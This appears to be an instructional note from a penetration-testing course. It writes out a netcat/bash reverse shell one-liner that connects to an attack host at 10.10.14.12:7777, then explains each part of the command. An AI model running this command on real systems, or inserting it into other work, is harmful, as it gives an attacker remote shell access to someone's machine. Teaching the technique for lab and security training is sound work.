
Below are previously used one liners, explained in depth

**Netcat/Bash Reverse Shell One-Liner**
```shell-session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```
	- `rm -f /tmp/f` Removes the `/tmp/f` file if it exists, `-f` causes `rm` to ignore nonexistent files
	- mkfifo /tmp/f Makes a FIFO named pipe file](https://man7.org/linux/man-pages/man7/fifo.7.html) at the location specified
	- cat /tmp/f Concatenates the FIFO named pipe file /tmp/f
	- /bin/bash -i 2>&1 Specifies the command language interpreter using the `-i` option to ensure the shell is interactive. `2>&1` ensures the standard error data stream (`2`) `&` standard output data stream (`1`) are redirected to the command following the pip
	- nc 10.10.14.12 7777 > /tmp/f Uses Netcat to send a connection to our attack host `10.10.14.12` listening on port `7777`. The output will be redirected (`>`) to /tmp/f, serving the Bash shell to our waiting Netcat listener when the reverse shell one-liner command is executed

